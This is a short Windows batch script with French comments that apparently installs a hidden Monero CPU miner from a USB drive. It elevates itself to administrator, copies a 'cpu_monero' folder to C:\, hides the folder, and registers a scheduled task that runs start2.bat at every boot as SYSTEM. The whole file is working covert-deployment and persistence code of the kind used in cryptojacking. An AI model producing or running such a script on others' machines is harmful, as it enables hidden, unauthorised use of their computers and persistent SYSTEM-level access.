@echo off
:: Désactiver l'affichage des commandes

:: Vérifier si le script est exécuté en tant qu'administrateur
:: Nécessaire pour certaines opérations comme la modification de la tâche planifiée
:: Si ce n'est pas le cas, relancer le script avec les privilèges d'administrateur
:: >nul 2>&1 redirige la sortie et les erreurs vers nul pour les masquer
net session >nul 2>&1
if %errorLevel% == 0 (
    echo Admin privileges confirmed.
) else (
    echo Requesting admin privileges...
    :: Relancer le script avec les privilèges d'administrateur
    powershell -Command "Start-Process '%~f0' -Verb runAs"
    exit /b
)

:: Définir les chemins
set "sourcePath=%USBDriveLetter%:\cpu_monero"
set "destinationPath=C:\cpu_monero"

:: Copier le dossier de l'USB vers C:\
xcopy "%sourcePath%" "%destinationPath%" /E /H /C /I /Y

:: Rendre le dossier caché
attrib +h "%destinationPath%"

:: Entrer dans le dossier copié
cd /d "%destinationPath%"

:: Vérifier si le fichier start2.bat existe
if exist "start2.bat" (
    :: Créer une tâche planifiée pour exécuter start2.bat 5 minutes après le démarrage
    schtasks /create /tn "Start2Task" /tr "%destinationPath%\start2.bat" /sc onstart /delay 0005:00 /ru System
    echo Tâche planifiée créée pour exécuter start2.bat 5 minutes après le démarrage.
) else (
    echo Le fichier start2.bat n'a pas été trouvé dans le dossier copié.
)

:: Fin du script
echo Opération terminée.
pause